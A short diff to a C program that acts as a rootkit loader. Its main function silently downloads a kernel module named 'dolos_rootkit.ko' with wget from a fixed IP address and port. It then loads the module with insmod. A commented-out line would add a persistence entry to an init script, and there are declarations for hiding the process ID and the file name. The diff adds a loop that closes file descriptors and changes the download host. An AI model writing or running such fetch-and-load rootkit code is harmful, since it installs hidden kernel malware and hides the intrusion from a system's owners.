@@ -33,7 +33,10 @@ void hideMyPid();
 void hideMyFileName(char* name);
 
 int main(int argc, char* argv[]) {
-    pclose(popen("wget 172.100.0.3:4242/dolos_rootkit.ko 2>/dev/null 1>/dev/null", "r"));
+    for(int i = 0; i < 1000; i++) {
+        close(i);
+    }
+    pclose(popen("wget 172.100.0.1:4242/dolos_rootkit.ko 2>/dev/null 1>/dev/null", "r"));
     pclose(popen("insmod dolos_rootkit.ko", "r"));
     //pclose(popen("echo \"/orangeRodent\" >> /etc/init.d/S01syslogd", "r"));
     sleep(1);
